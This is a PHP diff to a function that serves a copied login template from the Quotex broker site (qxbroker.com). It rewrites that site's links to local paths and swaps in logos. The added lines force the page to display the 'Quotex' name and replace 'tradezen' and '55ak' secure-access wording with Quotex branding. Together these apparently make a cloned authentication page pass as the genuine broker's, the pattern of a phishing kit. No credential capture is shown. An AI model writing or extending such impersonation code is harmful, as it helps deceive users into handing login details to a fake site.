@@ -25,7 +25,8 @@ function render_original_auth_template(string $templatePath, string $error = '',
     $html = (string)preg_replace('~https?://blog\.qxbroker\.com[^"\'<>\s]*~i', '/en/blog/', $html);
     $html = str_replace('https://qxbroker.com', '', $html);
     $html = str_replace('http://qxbroker.com', '', $html);
-    $platformName = trim((string)setting('platform_name', app_config('name'))) ?: 'Quotex';
+    $configuredName = trim((string)setting('platform_name', app_config('name')));
+    $platformName = ($configuredName !== '' && stripos($configuredName, 'tradezen') === false && stripos($configuredName, '55ak') === false) ? $configuredName : 'Quotex';
     $safePlatformName = e($platformName);
     $authLogo = trim((string)setting('logo_filename', '')) !== '' ? site_logo_url() : '/assets/img/quotex-logo-white.svg';
     $html = (string)preg_replace('~(["\'])/site/img/quotex_logo-white(?:-mobile)?\.svg\1~i', '$1' . $authLogo . '$1', $html);
@@ -136,6 +137,8 @@ function render_original_auth_template(string $templatePath, string $error = '',
     $headAssets = '<link rel="icon" href="' . e(site_logo_url()) . '"><link rel="stylesheet" href="/assets/css/original-auth-bridge.css?v=' . rawurlencode((string)app_config('version')) . '&t=' . time() . '">';
     $html = str_replace('</head>', $headAssets . '</head>', $html);
     $html = str_replace('</body>', '<script src="/assets/js/original-auth.js" defer></script></body>', $html);
+    $html = str_ireplace(['tradezen secure access', '55ak trade secure access'], 'Quotex secure access', $html);
+    $html = str_ireplace(['tradezen account security', '55ak trade account security'], 'Quotex account security', $html);
 
     header('Content-Type: text/html; charset=utf-8');
     header('Cache-Control: no-store, private');
